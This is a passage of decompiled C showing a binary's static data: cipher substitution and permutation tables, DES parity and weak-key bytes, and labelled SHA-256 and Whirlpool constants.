  '}',
  '2',
  '\xBD',
  '\x8F',
  '@',
  '\xEB',
  '\x86',
  '\xB7',
  '{',
  '\v',
  '\xF0',
  '\x95',
  '!',
  '\"',
  '\\',
  'k',
  'N',
  '\x82',
  'T',
  '\xD6',
  'e',
  '\x93',
  '\xCE',
  '`',
  '\xB2',
  '\x1C',
  's',
  'V',
  '\xC0',
  '\x14',
  '\xA7',
  '\x8C',
  '\xF1',
  '\xDC',
  '\x12',
  'u',
  '\xCA',
  '\x1F',
  ';',
  '\xBE',
  '\xE4',
  '\xD1',
  'B',
  '=',
  '\xD4',
  '0',
  '\xA3',
  '<',
  '\xB6',
  '&',
  'o',
  '\xBF',
  '\x0E',
  '\xDA',
  'F',
  'i',
  '\a',
  'W',
  '\'',
  '\xF2',
  '\x1D',
  '\x9B',
  '\xBC',
  '\x94',
  'C',
  '\x03',
  '\xF8',
  '\x11',
  '\xC7',
  '\xF6',
  '\x90',
  '\xEF',
  '>',
  '\xE7',
  '\x06',
  '\xC3',
  '\xD5',
  '/',
  '\xC8',
  'f',
  '\x1E',
  '\xD7',
  '\b',
  '\xE8',
  '\xEA',
  '\xDE',
  '',
  'R',
  '\xEE',
  '\xF7',
  '\x84',
  '\xAA',
  'r',
  '\xAC',
  '5',
  'M',
  'j',
  '*',
  '\x96',
  '\x1A',
  '\xD2',
  'q',
  'Z',
  '\x15',
  'I',
  't',
  'K',
  '\x9F',
  '\xD0',
  '^',
  '\x04',
  '\x18',
  '\xA4',
  '\xEC',
  '\xC2',
  '\xE0',
  'A',
  'n',
  '\x0F',
  'Q',
  '\xCB',
  '\xCC',
  '$',
  '\x91',
  '\xAF',
  'P',
  '\xA1',
  '\xF4',
  'p',
  '9',
  '\x99',
  '|',
  ':',
  '\x85',
  '#',
  '\xB8',
  '\xB4',
  'z',
  '\xFC',
  '\x02',
  '6',
  '[',
  '%',
  'U',
  '\x97',
  '1',
  '-',
  ']',
  '\xFA',
  '\x98',
  '\xE3',
  '\x8A',
  '\x92',
  '\xAE',
  '\x05',
  '\xDF',
  ')',
  '\x10',
  'g',
  'l',
  '\xBA',
  '\xC9',
  '\xD3',
  '\0',
  '\xE6',
  '\xCF',
  '\xE1',
  '\x9E',
  '\xA8',
  ',',
  'c',
  '\x16',
  '\x01',
  '?',
  'X',
  '\xE2',
  '\x89',
  '\xA9',
  '\r',
  '8',
  '4',
  '\x1B',
  '\xAB',
  '3',
  '\xFF',
  '\xB0',
  '\xBB',
  'H',
  '\f',
  '_',
  '\xB9',
  '\xB1',
  '\xCD',
  '.',
  '\xC5',
  '\xF3',
  '\xDB',
  'G',
  '\xE5',
  '\xA5',
  '\x9C',
  'w',
  '\n',
  '\xA6',
  ' ',
  'h',
  '\xFE',
  '\x7F',
  '\xC1',
  '\xAD'
}; // weak
int dword_528928[256] =
{
  696885672,
  92635524,
  382128852,
  331600848,
  340021332,
  487395612,
  747413676,
  621093156,
  491606364,
  54739776,
  403181592,
  504238620,
  289493328,
  1020063996,
  181060296,
  591618912,
  671621160,
  71581764,
  536879136,
  495817116,
  549511392,
  583197408,
  147374280,
  386339604,
  629514660,
  261063564,
  50529024,
  994800504,
  999011256,
  318968592,
  314757840,
  785310444,
  809529456,
  210534540,
  1057960764,
  680042664,
  839004720,
  500027868,
  919007988,
  876900468,
  751624428,
  361075092,
  185271048,
  390550356,
  474763356,
  457921368,
  1032696252,
  16843008,
  604250148,
  470552604,
  860058480,
  411603096,
  268439568,
  214745292,
  851636976,
  432656856,
  738992172,
  667411428,
  843215472,
  58950528,
  462132120,
  297914832,
  109478532,
  164217288,
  541089888,
  272650320,
  595829664,
  734782440,
  218956044,
  914797236,
  512660124,
  256852812,
  931640244,
  441078360,
  113689284,
  944271480,
  646357668,
  302125584,
  797942700,
  365285844,
  557932896,
  63161280,
  881111220,
  21053760,
  306336336,
  1028485500,
  227377548,
  134742024,
  521081628,
  428446104,
  0,
  420024600,
  67371012,
  323179344,
  935850996,
  566354400,
  1036907004,
  910586484,
  789521196,
  654779172,
  813740208,
  193692552,
  235799052,
  730571688,
  578986656,
  776888940,
  327390096,
  223166796,
  692674920,
  1011642492,
  151585032,
  168428040,
  1066382268,
  802153452,
  868479984,
  96846276,
  126321540,
  335810580,
  1053750012,
  608460900,
  516870876,
  772678188,
  189481800,
  436867608,
  101057028,
  553722144,
  726360936,
  642146916,
  33686016,
  902164980,
  310547088,
  176849544,
  202113036,
  864269232,
  1045328508,
  281071824,
  977957496,
  122110788,
  377918100,
  633725412,
  637936164,
  8421504,
  764256684,
  533713884,
  562143648,
  805318704,
  923218740,
  781099692,
  906375732,
  352653588,
  570565152,
  940060728,
  885321972,
  663200676,
  88424772,
  206323788,
  25264512,
  701096424,
  75792516,
  394761108,
  889532724,
  197903304,
  248431308,
  1007431740,
  826372464,
  285282576,
  130532292,
  160006536,
  893743476,
  1003222008,
  449499864,
  952692984,
  344232084,
  424235352,
  42107520,
  80003268,
  1070593020,
  155795784,
  956903736,
  658989924,
  12632256,
  265274316,
  398971860,
  948482232,
  252642060,
  244220556,
  37896768,
  587408160,
  293704080,
  743202924,
  466342872,
  612671652,
  872689716,
  834793968,
  138952776,
  46318272,
  793731948,
  1024274748,
  755835180,
  4210752,
  1049539260,
  1041117756,
  1015853244,
  29475264,
  713728680,
  982168248,
  240009804,
  356864340,
  990589752,
  483184860,
  675831912,
  1062171516,
  478974108,
  415813848,
  172638792,
  373707348,
  927429492,
  545300640,
  768467436,
  105267780,
  897954228,
  722150184,
  625303908,
  986379000,
  600040416,
  965325240,
  830583216,
  529503132,
  508449372,
  969535992,
  650568420,
  847426224,
  822161712,
  717939432,
  760045932,
  525292380,
  616882404,
  817950960,
  231588300,
  143163528,
  369496596,
  973746744,
  407392344,
  348442836,
  574775904,
  688464168,
  117900036,
  855847728,
  684253416,
  453710616,
  84214020,
  961114488,
  276861072,
  709517928,
  705307176,
  445289112
}; // weak
int dword_528D28[256] =
{
  943196208,
  -399980320,
  741149985,
  -1540979038,
  -871379005,
  -601960750,
  -1338801229,
  -1204254544,
  -1406169181,
  1612726368,
  1410680145,
  -1006123069,
  1141130304,
  1815039843,
  1747667811,
  1478183763,
  -1073495101,
  1612857954,
  808649523,
  -1271560783,
  673777953,
  -1608482656,
  -534592798,
  -1540913245,
  -804011053,
  -1877900911,
  269549841,
  67503618,
  471600144,
  -1136882512,
  875955762,
  1208699715,
  -332410909,
  -2012706688,
  1814842464,
  -1473738592,
  337053459,
  -1006320448,
  336987666,
  -197868304,
  -1073560894,
  1141196097,
  -534658591,
  -736704814,
  1010765619,
  1010634033,
  -1945203070,
  -1743222640,
  673712160,
  1276005954,
  -197736718,
  1010699826,
  -1541044831,
  -130430479,
  202181889,
  -601894957,
  -669464368,
  673909539,
  1680229986,
  2017086066,
  606537507,
  741281571,
  -265174543,
  1882342002,
  1073889858,
  -736836400,
  1073824065,
  -1073692480,
  1882407795,
  1680295779,
  -1406366560,
  -2012509309,
  -197670925,
  -1406300767,
  -2147450752,
  471797523,
  -938816830,
  741084192,
  -1473607006,
  875824176,
  -804076846,
  134941443,
  -332476702,
  -399914527,
  1545424209,
  -1810594672,
  404228112,
  -130496272,
  1410811731,
  -1406234974,
  134744064,
  -1006254655,
  269681427,
  -871510591,
  -2079947134,
  -1204188751,
  -62926861,
  2084392305,
  -1073626687,
  808517937,
  -197802511,
  -2012575102,
  1747602018,
  -1338932815,
  -804142639,
  538968096,
  -736639021,
  131586,
  539099682,
  67372032,
  1747470432,
  1882276209,
  67569411,
  -669266989,
  -1675784815,
  -1743156847,
  1612792161,
  -1136750926,
  -467220766,
  1478052177,
  -602026543,
  1343308113,
  -1877966704,
  -602092336,
  -1743091054,
  -1608285277,
  -1473541213,
  -804208432,
  -2147384959,
  202313475,
  1141327683,
  404359698,
  -534527005,
  -332608288,
  -1945268863,
  -1136685133,
  -1810463086,
  2017151859,
  1545358416,
  -1608351070,
  -1608416863,
  1612923747,
  539165475,
  1275940161,
  -938948416,
  -1675719022,
  -1675850608,
  943327794,
  202116096,
  741215778,
  -1204122958,
  1814974050,
  -1675653229,
  1478117970,
  -265108750,
  -1877835118,
  -265042957,
  1208568129,
  2016954480,
  -871576384,
  336921873,
  -130298893,
  1882210416,
  1949648241,
  2084523891,
  875889969,
  269484048,
  197379,
  1680098400,
  1814908257,
  -1006188862,
  1949582448,
  -736770607,
  -1271626576,
  -399848734,
  134809857,
  1949714034,
  404293905,
  -62992654,
  1073758272,
  269615634,
  -534724384,
  -1136816719,
  67437825,
  -130364686,
  65793,
  -265240336,
  673843746,
  1545490002,
  -1473672799,
  1410745938,
  1073955651,
  -2080012927,
  336856080,
  -2012640895,
  -1743025261,
  -1338998608,
  -467286559,
  1208502336,
  2017020273,
  -1810397293,
  -63124240,
  471731730,
  -2147319166,
  539033889,
  -1945334656,
  404425491,
  1545555795,
  1949779827,
  1410614352,
  -1338867022,
  471665937,
  606405921,
  1276071747,
  0,
  1141261890,
  -332542495,
  1477986384,
  1343373906,
  -399782941,
  2084458098,
  -669332782,
  -938882623,
  -63058447,
  808452144,
  -1810528879,
  1680164193,
  1010568240,
  -1271494990,
  -467352352,
  -1204057165,
  2084326512,
  202247682,
  1343242320,
  943262001,
  606471714,
  808583730,
  -2080078720,
  1747536225,
  -1877769325,
  876021555,
  -467154973,
  606340128,
  -1541110624,
  -938751037,
  1343439699,
  134875650,
  -2079881341,
  -669398575,
  1275874368,
  -2147253373,
  -1945137277,
  -871444798,
  943393587,
  1208633922,
  -1271429197
}; // weak
int dword_529128[256] =
{
  -1582814839,
  -2122054267,
  -757852474,
  -741338173,
  1347687492,
  287055117,
  -1599329140,
  556016901,
  1364991309,
  1128268611,
  270014472,
  303832590,
  1364201793,
  -251904820,
  -1027077430,
  1667244867,
  539502600,
  1078199364,
  538976256,
  -1852039795,
  -522182464,
  -488627518,
  -1060632376,
  320083719,
  -1583078011,
  -2087972977,
  50332419,
  1937259339,
  -1279771765,
  319820547,
  -758115646,
  -487838002,
  1886400576,
  -2138305396,
  859586319,
  -1599592312,
  842019330,
  -774103603,
  -218876218,
  1886663748,
  -521392948,
  -1852566139,
  50858763,
  1398019911,
  1348213836,
  1398283083,
  -1313063539,
  16777473,
  539239428,
  270277644,
  1936732995,
  -1869080440,
  269488128,
  -1060369204,
  -219139390,
  -774366775,
  539765772,
  -471586873,
  1919955522,
  -2088762493,
  -1818748021,
  -774893119,
  -2105276794,
  -1043854903,
  1616912448,
  1347424320,
  -1549786237,
  -471323701,
  17566989,
  -1296812410,
  -1835262322,
  1129058127,
  -1280034937,
  1381505610,
  -1027340602,
  1886926920,
  -1566300538,
  303043074,
  -1548996721,
  -774629947,
  1633689921,
  -1010826301,
  -1330367356,
  1094713665,
  1380979266,
  1903967565,
  -2121527923,
  526344,
  320610063,
  -1852302967,
  0,
  286791945,
  263172,
  1397756739,
  -202098745,
  -505404991,
  -235127347,
  1920218694,
  590098191,
  589571847,
  -1330630528,
  -2088236149,
  34344462,
  -1549259893,
  -1566563710,
  1651256910,
  -1819274365,
  1095503181,
  1634216265,
  1887190092,
  17303817,
  34081290,
  -1279508593,
  -471060529,
  -202361917,
  -1044118075,
  -2088499321,
  269751300,
  -218349874,
  1617175620,
  -757326130,
  573320718,
  1128794955,
  303569418,
  33818118,
  555753729,
  1667771211,
  1650730566,
  33554946,
  -235653691,
  -1836051838,
  -2105013622,
  789516,
  -1280298109,
  1920745038,
  -791670592,
  1920481866,
  1128531783,
  -1835788666,
  -505141819,
  572794374,
  -2139094912,
  -1582551667,
  -740548657,
  -1583341183,
  808464384,
  859059975,
  -1565774194,
  842282502,
  286528773,
  572531202,
  808990728,
  -252431164,
  -1549523065,
  1094976837,
  1078725708,
  -2122317439,
  -504878647,
  -2138831740,
  -1819011193,
  825505029,
  -1010299957,
  -1026814258,
  809253900,
  1903178049,
  286265601,
  -1010563129,
  -2121791095,
  1903441221,
  -201835573,
  -757589302,
  -252167992,
  -1869343612,
  1364728137,
  -2105539966,
  -1060895548,
  -201572401,
  1095240009,
  825768201,
  1667508039,
  -1061158720,
  -1010036785,
  -741075001,
  -1330104184,
  51121935,
  -2104750450,
  1111491138,
  589308675,
  -1852829311,
  1617701964,
  -740811829,
  -1599855484,
  808727556,
  -235916863,
  1078462536,
  -1027603774,
  1668034383,
  826031373,
  556543245,
  1077936192,
  -1296286066,
  842808846,
  -1329841012,
  -1044381247,
  -1566037366,
  -1296549238,
  1112280654,
  1364464965,
  859323147,
  -790881076,
  1617438792,
  1937522511,
  -1868817268,
  -791144248,
  1112017482,
  1381242438,
  1936996167,
  -1600118656,
  -504615475,
  1111754310,
  -1313589883,
  589835019,
  1633953093,
  -218613046,
  -471850045,
  -1313326711,
  -1313853055,
  -1818484849,
  1381768782,
  -235390519,
  -488364346,
  -1297075582,
  825241857,
  -488101174,
  1634479437,
  1398546255,
  -521919292,
  -252694336,
  -1043591731,
  -2138568568,
  303306246,
  842545674,
  1347950664,
  -791407420,
  1650467394,
  556280073,
  50595591,
  858796803,
  -521656120,
  320346891,
  17040645,
  1903704393,
  -1869606784,
  1650993738,
  573057546,
  -1835525494
}; // weak
int dword_529528[256] =
{
  137377848,
  -924784600,
  220277805,
  -2036161498,
  -809251825,
  -825041890,
  -2085375949,
  -2001684424,
  -1885098961,
  1080057888,
  1162957845,
  -943471609,
  1145062404,
  1331915823,
  1264805931,
  1263753243,
  -1010581501,
  1113743394,
  53686323,
  -2051951563,
  153167913,
  -2136956896,
  -1025318878,
  -2019318745,
  -1009528813,
  -2121166831,
  17895441,
  100795398,
  202382364,
  -1934574532,
  103953462,
  1262700555,
  -807146449,
  -2004842488,
  1281387564,
  -2002737112,
  118690839,
  -993999868,
  101848086,
  -990841804,
  -1027424254,
  1161905157,
  -1042161631,
  -959261674,
  255015999,
  221330493,
  -1904047090,
  -2003789800,
  136325160,
  1312967694,
  -957156298,
  238173246,
  -2053004251,
  -906889159,
  218172429,
  -808199137,
  -925837288,
  186853419,
  1180853286,
  1249015866,
  119743527,
  253963311,
  -1041108943,
  1114796082,
  1111638018,
  -992947180,
  1094795265,
  -1061109760,
  1131638835,
  1197696039,
  -1935627220,
  -1954314229,
  -940313545,
  -1918784467,
  -2139062272,
  252910623,
  -893204470,
  203435052,
  -1969051606,
  70267956,
  -1026371566,
  184748043,
  -823989202,
  -907941847,
  1297177629,
  -2070899692,
  135272472,
  -923731912,
  1196643351,
  -1901941714,
  134219784,
  -977157115,
  51580947,
  -842937331,
  -2038266874,
  -1984841671,
  -806093761,
  1299283005,
  -1044267007,
  20000817,
  -973999051,
  -1971156982,
  1247963178,
  -2119061455,
  -1043214319,
  2105376,
  -942418921,
  33685506,
  35790882,
  67109892,
  1214277672,
  1097953329,
  117638151,
  -875309029,
  -1919837155,
  -1986947047,
  1096900641,
  -1900889026,
  -958208986,
  1230067737,
  -841884643,
  1095847953,
  -2138009584,
  -858727396,
  -1970104294,
  -2086428637,
  -1952208853,
  -1060057072,
  -2122219519,
  251857935,
  1195590663,
  168957978,
  -1008476125,
  -857674708,
  -1920889843,
  -1884046273,
  -2037214186,
  1265858619,
  1280334876,
  -2103271390,
  -2120114143,
  1130586147,
  52633635,
  1296124941,
  -926889976,
  -1902994402,
  -1936679908,
  171063354,
  201329676,
  237120558,
  -1967998918,
  1315073070,
  -1886151649,
  1246910490,
  -1024266190,
  -2104324078,
  -1007423437,
  1229015049,
  1215330360,
  -859780084,
  85005333,
  -873203653,
  1081110576,
  1165063221,
  1332968511,
  87110709,
  1052688,
  50528259,
  1147167780,
  1298230317,
  -960314362,
  1148220468,
  -976104427,
  -2068794316,
  -891099094,
  151062537,
  1181905974,
  152115225,
  -822936514,
  1077952512,
  34738194,
  -1059004384,
  -1917731779,
  83952645,
  -890046406,
  16842753,
  -1057951696,
  170010666,
  1314020382,
  -1985894359,
  1179800598,
  1128480771,
  -2055109627,
  68162580,
  -1987999735,
  -1953261541,
  -2135904208,
  -975051739,
  1212172296,
  1232173113,
  -2020371433,
  -856622020,
  236067870,
  -2105376766,
  18948129,
  -1937732596,
  185800731,
  1330863135,
  1198748727,
  1146115092,
  -2102218702,
  219225117,
  86058021,
  1329810447,
  0,
  1178747910,
  -840831955,
  1213224984,
  1112690706,
  -874256341,
  1316125758,
  -892151782,
  -910047223,
  -839779267,
  3158064,
  -2054056939,
  1164010533,
  204487740,
  -2035108810,
  -991894492,
  -1951156165,
  1282440252,
  235015182,
  1079005200,
  154220601,
  102900774,
  36843570,
  -2071952380,
  1231120425,
  -2087481325,
  120796215,
  -941366233,
  69215268,
  -2069847004,
  -876361717,
  1129533459,
  167905290,
  -2021424121,
  -908994535,
  1279282188,
  -2088534013,
  -1887204337,
  -826094578,
  187906107,
  1245857802,
  -2018266057
}; // weak
char byte_529928[384] =
{
  '\x01',
  '\x01',
  '\x02',
  '\x02',
  '\x04',
  '\x04',
  '\a',
  '\a',
  '\b',
  '\b',
  '\v',
  '\v',
  '\r',
  '\r',
  '\x0E',
  '\x0E',
  '\x10',
  '\x10',
  '\x13',
  '\x13',
  '\x15',
  '\x15',
  '\x16',
  '\x16',
  '\x19',
  '\x19',
  '\x1A',
  '\x1A',
  '\x1C',
  '\x1C',
  '\x1F',
  '\x1F',
  ' ',
  ' ',
  '#',
  '#',
  '%',
  '%',
  '&',
  '&',
  ')',
  ')',
  '*',
  '*',
  ',',
  ',',
  '/',
  '/',
  '1',
  '1',
  '2',
  '2',
  '4',
  '4',
  '7',
  '7',
  '8',
  '8',
  ';',
  ';',
  '=',
  '=',
  '>',
  '>',
  '@',
  '@',
  'C',
  'C',
  'E',
  'E',
  'F',
  'F',
  'I',
  'I',
  'J',
  'J',
  'L',
  'L',
  'O',
  'O',
  'Q',
  'Q',
  'R',
  'R',
  'T',
  'T',
  'W',
  'W',
  'X',
  'X',
  '[',
  '[',
  ']',
  ']',
  '^',
  '^',
  'a',
  'a',
  'b',
  'b',
  'd',
  'd',
  'g',
  'g',
  'h',
  'h',
  'k',
  'k',
  'm',
  'm',
  'n',
  'n',
  'p',
  'p',
  's',
  's',
  'u',
  'u',
  'v',
  'v',
  'y',
  'y',
  'z',
  'z',
  '|',
  '|',
  '\x7F',
  '\x7F',
  '',
  '',
  '\x83',
  '\x83',
  '\x85',
  '\x85',
  '\x86',
  '\x86',
  '\x89',
  '\x89',
  '\x8A',
  '\x8A',
  '\x8C',
  '\x8C',
  '\x8F',
  '\x8F',
  '\x91',
  '\x91',
  '\x92',
  '\x92',
  '\x94',
  '\x94',
  '\x97',
  '\x97',
  '\x98',
  '\x98',
  '\x9B',
  '\x9B',
  '\x9D',
  '\x9D',
  '\x9E',
  '\x9E',
  '\xA1',
  '\xA1',
  '\xA2',
  '\xA2',
  '\xA4',
  '\xA4',
  '\xA7',
  '\xA7',
  '\xA8',
  '\xA8',
  '\xAB',
  '\xAB',
  '\xAD',
  '\xAD',
  '\xAE',
  '\xAE',
  '\xB0',
  '\xB0',
  '\xB3',
  '\xB3',
  '\xB5',
  '\xB5',
  '\xB6',
  '\xB6',
  '\xB9',
  '\xB9',
  '\xBA',
  '\xBA',
  '\xBC',
  '\xBC',
  '\xBF',
  '\xBF',
  '\xC1',
  '\xC1',
  '\xC2',
  '\xC2',
  '\xC4',
  '\xC4',
  '\xC7',
  '\xC7',
  '\xC8',
  '\xC8',
  '\xCB',
  '\xCB',
  '\xCD',
  '\xCD',
  '\xCE',
  '\xCE',
  '\xD0',
  '\xD0',
  '\xD3',
  '\xD3',
  '\xD5',
  '\xD5',
  '\xD6',
  '\xD6',
  '\xD9',
  '\xD9',
  '\xDA',
  '\xDA',
  '\xDC',
  '\xDC',
  '\xDF',
  '\xDF',
  '\xE0',
  '\xE0',
  '\xE3',
  '\xE3',
  '\xE5',
  '\xE5',
  '\xE6',
  '\xE6',
  '\xE9',
  '\xE9',
  '\xEA',
  '\xEA',
  '\xEC',
  '\xEC',
  '\xEF',
  '\xEF',
  '\xF1',
  '\xF1',
  '\xF2',
  '\xF2',
  '\xF4',
  '\xF4',
  '\xF7',
  '\xF7',
  '\xF8',
  '\xF8',
  '\xFB',
  '\xFB',
  '\xFD',
  '\xFD',
  '\xFE',
  '\xFE',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\x01',
  '\xFE',
  '\xFE',
  '\xFE',
  '\xFE',
  '\xFE',
  '\xFE',
  '\xFE',
  '\xFE',
  '\x1F',
  '\x1F',
  '\x1F',
  '\x1F',
  '\x0E',
  '\x0E',
  '\x0E',
  '\x0E',
  '\xE0',
  '\xE0',
  '\xE0',
  '\xE0',
  '\xF1',
  '\xF1',
  '\xF1',
  '\xF1',
  '\x01',
  '\xFE',
  '\x01',
  '\xFE',
  '\x01',
  '\xFE',
  '\x01',
  '\xFE',
  '\xFE',
  '\x01',
  '\xFE',
  '\x01',
  '\xFE',
  '\x01',
  '\xFE',
  '\x01',
  '\x1F',
  '\xE0',
  '\x1F',
  '\xE0',
  '\x0E',
  '\xF1',
  '\x0E',
  '\xF1',
  '\xE0',
  '\x1F',
  '\xE0',
  '\x1F',
  '\xF1',
  '\x0E',
  '\xF1',
  '\x0E',
  '\x01',
  '\xE0',
  '\x01',
  '\xE0',
  '\x01',
  '\xF1',
  '\x01',
  '\xF1',
  '\xE0',
  '\x01',
  '\xE0',
  '\x01',
  '\xF1',
  '\x01',
  '\xF1',
  '\x01',
  '\x1F',
  '\xFE',
  '\x1F',
  '\xFE',
  '\x0E',
  '\xFE',
  '\x0E',
  '\xFE',
  '\xFE',
  '\x1F',
  '\xFE',
  '\x1F',
  '\xFE',
  '\x0E',
  '\xFE',
  '\x0E',
  '\x01',
  '\x1F',
  '\x01',
  '\x1F',
  '\x01',
  '\x0E',
  '\x01',
  '\x0E',
  '\x1F',
  '\x01',
  '\x1F',
  '\x01',
  '\x0E',
  '\x01',
  '\x0E',
  '\x01',
  '\xE0',
  '\xFE',
  '\xE0',
  '\xFE',
  '\xF1',
  '\xFE',
  '\xF1',
  '\xFE',
  '\xFE',
  '\xE0',
  '\xFE',
  '\xE0',
  '\xFE',
  '\xF1',
  '\xFE',
  '\xF1'
}; // weak
int dword_529AA8[64] =
{
  0,
  16,
  536870912,
  536870928,
  65536,
  65552,
  536936448,
  536936464,
  2048,
  2064,
  536872960,
  536872976,
  67584,
  67600,
  536938496,
  536938512,
  32,
  48,
  536870944,
  536870960,
  65568,
  65584,
  536936480,
  536936496,
  2080,
  2096,
  536872992,
  536873008,
  67616,
  67632,
  536938528,
  536938544,
  524288,
  524304,
  537395200,
  537395216,
  589824,
  589840,
  537460736,
  537460752,
  526336,
  526352,
  537397248,
  537397264,
  591872,
  591888,
  537462784,
  537462800,
  524320,
  524336,
  537395232,
  537395248,
  589856,
  589872,
  537460768,
  537460784,
  526368,
  526384,
  537397280,
  537397296,
  591904,
  591920,
  537462816,
  537462832
}; // weak
int dword_529BA8[64] =
{
  0,
  33554432,
  8192,
  33562624,
  2097152,
  35651584,
  2105344,
  35659776,
  4,
  33554436,
  8196,
  33562628,
  2097156,
  35651588,
  2105348,
  35659780,
  1024,
  33555456,
  9216,
  33563648,
  2098176,
  35652608,
  2106368,
  35660800,
  1028,
  33555460,
  9220,
  33563652,
  2098180,
  35652612,
  2106372,
  35660804,
  268435456,
  301989888,
  268443648,
  301998080,
  270532608,
  304087040,
  270540800,
  304095232,
  268435460,
  301989892,
  268443652,
  301998084,
  270532612,
  304087044,
  270540804,
  304095236,
  268436480,
  301990912,
  268444672,
  301999104,
  270533632,
  304088064,
  270541824,
  304096256,
  268436484,
  301990916,
  268444676,
  301999108,
  270533636,
  304088068,
  270541828,
  304096260
}; // weak
int dword_529CA8[64] =
{
  0,
  1,
  262144,
  262145,
  16777216,
  16777217,
  17039360,
  17039361,
  2,
  3,
  262146,
  262147,
  16777218,
  16777219,
  17039362,
  17039363,
  512,
  513,
  262656,
  262657,
  16777728,
  16777729,
  17039872,
  17039873,
  514,
  515,
  262658,
  262659,
  16777730,
  16777731,
  17039874,
  17039875,
  134217728,
  134217729,
  134479872,
  134479873,
  150994944,
  150994945,
  151257088,
  151257089,
  134217730,
  134217731,
  134479874,
  134479875,
  150994946,
  150994947,
  151257090,
  151257091,
  134218240,
  134218241,
  134480384,
  134480385,
  150995456,
  150995457,
  151257600,
  151257601,
  134218242,
  134218243,
  134480386,
  134480387,
  150995458,
  150995459,
  151257602,
  151257603
}; // weak
int dword_529DA8[64] =
{
  0,
  1048576,
  256,
  1048832,
  8,
  1048584,
  264,
  1048840,
  4096,
  1052672,
  4352,
  1052928,
  4104,
  1052680,
  4360,
  1052936,
  67108864,
  68157440,
  67109120,
  68157696,
  67108872,
  68157448,
  67109128,
  68157704,
  67112960,
  68161536,
  67113216,
  68161792,
  67112968,
  68161544,
  67113224,
  68161800,
  131072,
  1179648,
  131328,
  1179904,
  131080,
  1179656,
  131336,
  1179912,
  135168,
  1183744,
  135424,
  1184000,
  135176,
  1183752,
  135432,
  1184008,
  67239936,
  68288512,
  67240192,
  68288768,
  67239944,
  68288520,
  67240200,
  68288776,
  67244032,
  68292608,
  67244288,
  68292864,
  67244040,
  68292616,
  67244296,
  68292872
}; // weak
int dword_529EA8[64] =
{
  0,
  268435456,
  65536,
  268500992,
  4,
  268435460,
  65540,
  268500996,
  536870912,
  805306368,
  536936448,
  805371904,
  536870916,
  805306372,
  536936452,
  805371908,
  1048576,
  269484032,
  1114112,
  269549568,
  1048580,
  269484036,
  1114116,
  269549572,
  537919488,
  806354944,
  537985024,
  806420480,
  537919492,
  806354948,
  537985028,
  806420484,
  4096,
  268439552,
  69632,
  268505088,
  4100,
  268439556,
  69636,
  268505092,
  536875008,
  805310464,
  536940544,
  805376000,
  536875012,
  805310468,
  536940548,
  805376004,
  1052672,
  269488128,
  1118208,
  269553664,
  1052676,
  269488132,
  1118212,
  269553668,
  537923584,
  806359040,
  537989120,
  806424576,
  537923588,
  806359044,
  537989124,
  806424580
}; // weak
int dword_529FA8[64] =
{
  0,
  134217728,
  8,
  134217736,
  1024,
  134218752,
  1032,
  134218760,
  131072,
  134348800,
  131080,
  134348808,
  132096,
  134349824,
  132104,
  134349832,
  1,
  134217729,
  9,
  134217737,
  1025,
  134218753,
  1033,
  134218761,
  131073,
  134348801,
  131081,
  134348809,
  132097,
  134349825,
  132105,
  134349833,
  33554432,
  167772160,
  33554440,
  167772168,
  33555456,
  167773184,
  33555464,
  167773192,
  33685504,
  167903232,
  33685512,
  167903240,
  33686528,
  167904256,
  33686536,
  167904264,
  33554433,
  167772161,
  33554441,
  167772169,
  33555457,
  167773185,
  33555465,
  167773193,
  33685505,
  167903233,
  33685513,
  167903241,
  33686529,
  167904257,
  33686537,
  167904265
}; // weak
int dword_52A0A8[64] =
{
  0,
  256,
  524288,
  524544,
  16777216,
  16777472,
  17301504,
  17301760,
  16,
  272,
  524304,
  524560,
  16777232,
  16777488,
  17301520,
  17301776,
  2097152,
  2097408,
  2621440,
  2621696,
  18874368,
  18874624,
  19398656,
  19398912,
  2097168,
  2097424,
  2621456,
  2621712,
  18874384,
  18874640,
  19398672,
  19398928,
  512,
  768,
  524800,
  525056,
  16777728,
  16777984,
  17302016,
  17302272,
  528,
  784,
  524816,
  525072,
  16777744,
  16778000,
  17302032,
  17302288,
  2097664,
  2097920,
  2621952,
  2622208,
  18874880,
  18875136,
  19399168,
  19399424,
  2097680,
  2097936,
  2621968,
  2622224,
  18874896,
  18875152,
  19399184,
  19399440
}; // weak
int dword_52A1A8[65] =
{
  0,
  67108864,
  262144,
  67371008,
  2,
  67108866,
  262146,
  67371010,
  8192,
  67117056,
  270336,
  67379200,
  8194,
  67117058,
  270338,
  67379202,
  32,
  67108896,
  262176,
  67371040,
  34,
  67108898,
  262178,
  67371042,
  8224,
  67117088,
  270368,
  67379232,
  8226,
  67117090,
  270370,
  67379234,
  2048,
  67110912,
  264192,
  67373056,
  2050,
  67110914,
  264194,
  67373058,
  10240,
  67119104,
  272384,
  67381248,
  10242,
  67119106,
  272386,
  67381250,
  2080,
  67110944,
  264224,
  67373088,
  2082,
  67110946,
  264226,
  67373090,
  10272,
  67119136,
  272416,
  67381280,
  10274,
  67119138,
  272418,
  67381282,
  0
}; // weak
_UNKNOWN unk_52A2AC; // weak
_UNKNOWN SHA256_Constants_52A2EC; // weak
_UNKNOWN unk_52A8E8; // weak
_UNKNOWN unk_52AB55; // weak
_UNKNOWN unk_52ADF8; // weak
_UNKNOWN unk_52ADFA; // weak
_UNKNOWN unk_52BDF8; // weak
int WHIRLPOOL_Constants_52C5A0[] = { 408950808 }; // weak
int dword_52C5A4[] = { -667912000 }; // weak
_UNKNOWN unk_52CDA0; // weak
_UNKNOWN unk_52CDF0; // weak
void *off_52D340 = &unk_52CDF0; // weak
void *off_52D354 = &unk_52CE70; // weak
void *off_52D368 = &unk_52CEF0; // weak
void *off_52D37C = &unk_52CF20; // weak
void *off_52D390 = &unk_52D020; // weak
void *off_52D3A4 = &unk_52CF04; // weak
void *off_52D3B8 = &unk_52D120; // weak
void *off_52D3CC = &unk_52D220; // weak
void *off_52D3E0 = &unk_52D320; // weak
_UNKNOWN unk_52D81C; // weak
_UNKNOWN unk_52D84C; // weak
_UNKNOWN unk_52D8D8; // weak
_UNKNOWN unk_52D998; // weak
_UNKNOWN unk_52D9F0; // weak
int dword_52F77C[] = { 1380009284 }; // weak
const char word_52F7B8[] = { '\\', '\0' }; // idb
_UNKNOWN unk_52F974; // weak
_DWORD dword_531000 = 16777216; // weak
_DWORD dword_531110 = 4096; // weak
_DWORD dword_5311A0 = 2; // weak
int dword_531278 = 128; // weak
int dword_53127C = 1; // weak
int dword_531280 = 1; // weak
int (__cdecl *off_531284)(size_t Size) = &sub_4133F0; // weak
